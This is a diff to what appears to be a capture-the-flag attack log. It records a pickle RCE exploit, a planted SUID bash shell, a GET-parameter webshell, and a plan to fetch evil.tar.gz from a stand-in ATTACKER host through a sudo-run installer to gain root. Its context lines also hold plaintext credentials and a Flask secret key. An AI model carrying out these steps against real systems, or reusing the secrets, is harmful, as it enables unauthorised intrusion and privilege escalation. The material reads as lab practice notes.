@@ -141,3 +141,24 @@ downloaded_path = index.download(plugin_url, PLUGIN_DIR)
 ## Credentials
 - gitbot:G1tB0t_Acc3ss_2025! (portal login)
 - Flask SECRET_KEY: 7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371
+
+## BREAKTHROUGH CONFIRMED
+- /tmp/sb exists: -rwsr-xr-x 1 STEVE steve — SUID bash owned by steve!
+- CVE-2025-15276 pickle RCE WORKED. Steve's cron DID fire eventually.
+- euid=1000(steve) confirmed. ls /home/steve/ works.
+- user.txt exists (root:steve 640)
+- Box died before we could cat the flag. ONE command away.
+
+## Tooling lessons
+- /etc/hosts had 4 stale entries — caused most "box down" false alarms
+- 700KB binary webshell caused timeouts — clean 30-byte shell fixed it
+- curl without --connect-timeout hangs forever — always set timeouts
+- wget sometimes hangs when curl works fine
+- Use GET params for shell_exec, not POST (shell reads $_GET["c"])
+
+## Next steps on box respawn
+1. Fix /etc/hosts (ONE entry only)
+2. Redeploy: webshell + clean shell + SFD pickle exploit (30 sec)
+3. Read /tmp/sb -p -c 'cat /home/steve/user.txt' → user flag
+4. Read steve's sudo -l → likely sudo /opt/font-tools/install_validator.py
+5. Host evil.tar.gz → sudo install_validator.py http://ATTACKER/evil.tar.gz → root
